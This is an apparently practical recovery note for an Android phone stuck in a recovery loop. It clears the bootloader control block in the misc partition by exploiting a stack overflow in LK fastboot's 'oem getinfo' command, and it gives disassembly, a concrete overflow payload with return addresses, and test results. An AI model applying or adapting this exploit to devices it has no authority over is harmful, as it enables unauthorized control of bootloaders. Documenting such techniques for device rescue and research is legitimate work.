# Clearing the misc BCB from LK fastboot (recovery-loop rescue)

When the recovery partition contains a kernel that hangs before USB init, the
`misc` BCB keeps `boot-recovery` across reboots and the phone never reaches
Android. `fastboot reboot` boots recovery again; `oem reboot-fastboot` only
rewrites the BCB to `boot-fastboot`, which LK does not clear either.

This note documents a **RAM-only** way to clear the BCB from LK fastboot, so the
next boot goes to normal Android. It does not write any partition except `misc`
through LK's own writer.

## Mechanism

`oem reboot-fastboot` (VA `0x4C42E734`) calls `write_misc_bootmode`
(`0x4C4265A0`), which builds a buffer starting with the literal
`"boot-fastboot"` (VA `0x4C4A1694`) and writes `0x1800` bytes to `misc` at
offset 0.

Inside that function:

```
4C4265E2  2046      mov  r0, r4
4C4265E4  4FF4C051  mov.w r1, #0x1800
4C4265E8  FFF75AFF  bl   0x4C4264A0    ; misc_write(buf, 0x1800)
```

If we jump to `0x4C4265E2` with `r4` pointing at a byte that is already `0`, LK
writes `0x1800` bytes starting with a NUL into `misc` — the BCB command field
becomes empty, which the bootloader treats as a normal boot.

`0x4C4A16A1` is exactly the NUL right after `"boot-fastboot"`, and the rodata
around it is mapped and readable, so it works as a zero source without any
setup.

## Payload

Reuse the `oem getinfo` stack overflow (62 bytes):

```
"oem getinfo A " + 36×'A' + LE32(r4) + LE32(r5) + LE32(pc)

r4 = 0x4C4A16A1     ; zero source (NUL after "boot-fastboot")
r5 = 0x4C501CC4     ; dispatcher state, keep as-is
pc = 0x4C4265E3     ; 0x4C4265E2 | thumb
```

All address bytes are free of `00/20/0A/0D`.

## Observed result (2026-11-05, 6.13.30)

* the command returns `OKAY` and LK **stays alive** (the follow-up `getvar` is
  answered), then the device reboots into Android;
* reading `misc` back shows the first bytes as
  `00 00 00 42 6f 6f 74 20 63 6f 6d 6d 61 6e 64 3a ...` — the NULs plus
  `"Boot command: ..."` from the rodata we pointed at, i.e. an empty command;
* the recovery partition is restored to stock by the next normal boot;
* reproduced twice on the same device.

## Requirements / caveats

* LK fastboot must be reachable (volume-down + power).
* The addresses are for the 6.13.30 `lk.img`; a different LK build needs new
  offsets.
* This is a RAM code path: nothing persists except the `misc` write. It cannot
  bypass the flash gate and cannot flash `boot`/`super`.
* Driver script: `lkfuzz/exploit_clear_bcb.py` (`--dump` / `--fire`).
